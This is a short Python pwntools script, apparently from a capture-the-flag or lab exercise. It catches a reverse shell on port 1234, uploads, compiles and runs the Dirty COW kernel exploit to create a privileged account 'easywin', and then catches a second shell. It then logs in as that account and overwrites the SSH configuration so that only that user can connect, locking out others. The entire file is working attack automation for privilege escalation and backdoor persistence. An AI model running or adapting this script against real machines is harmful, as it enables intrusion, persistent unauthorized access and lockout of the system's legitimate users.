#! /usr/bin/env python3
from pwn import *
import time

file = open('dirty.c', 'r')
content = file.read()
file.close()

l = listen(1234)
l.wait_for_connection()

# Send dirty cow exploit code
l.sendline("cat > dirty.c << EOF")
l.sendline(content)
l.sendline("EOF")

l.sendline("gcc dirty.c -o dirty -pthread -lcrypt && ./dirty easywin")
l.close()

print("Please resend reverse shell")
l = listen(1234)
l.wait_for_connection()
l.sendline("su easywin")
time.sleep(1)
l.sendline("easywin")
time.sleep(1)
l.sendline("echo 'AllowUsers easywin' > /etc/ssh/sshd_config")
l.sendline("service ssh restart")
l.interactive()
